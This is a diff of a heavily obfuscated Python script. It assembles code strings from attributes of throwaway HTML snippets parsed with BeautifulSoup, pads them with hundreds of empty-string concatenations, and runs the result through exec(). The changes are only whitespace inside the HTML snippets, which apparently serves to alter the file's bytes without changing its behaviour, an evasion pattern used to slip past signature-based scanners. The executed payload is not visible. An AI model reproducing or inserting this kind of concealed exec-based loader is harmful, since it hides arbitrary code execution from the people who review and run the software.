@@ -8,9 +8,9 @@ suwrtweqarC = BeautifulSoup("""
 </body>
 </html>
 """, "html.parser").html.body.chunguselement["""f1"""]+""+""+""+BeautifulSoup("""
-<html>
+            <html>
 <head></head>
-<body><chunguselement f1="f" f2="1.htm">
+ <body><chunguselement f1="f" f2="1.htm">
 </body>
 </html>
 """, "html.parser").html.body.chunguselement["""f2"""]
@@ -18,13 +18,13 @@ amtdewedwuy = BeautifulSoup("""
 <html>
 <head></head>
 <body><chunguselement f1="f" f2="2">
-</body>
+ </body>
 </html>
 """, "html.parser").html.body.chunguselement["""f1"""]+""+""+""+BeautifulSoup("""
 <html>
 <head></head>
-<body><chunguselement f1="f" f2="2">
-</body>
+<body>       <chunguselement f1="f" f2="2">
+  </body>
 </html>
 """, "html.parser").html.body.chunguselement["""f2"""]
 trwdnewedwit = BeautifulSoup("""
@@ -148,15 +148,20 @@ c2 = hand1.                                                                     
 
 
 exec(c+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+c2)
-</chunguselement>
-</body>
+                          </chunguselement>
+ </body>
 </html>
 """.format(suwrtweqarC, amtdewedwuy), "html.parser").html.body.chunguselement.string+""+""+""+BeautifulSoup("""
 <html>
-<head></head>
+<head>   
+
+
+
+
+  </head>
 <body><chunguselement f1="f" f2="">
-</body>
-</html>
+      </body>
+ </html>
 """, "html.parser").html.body.chunguselement["""f2"""]
 
 exec(trwdnewedwit)
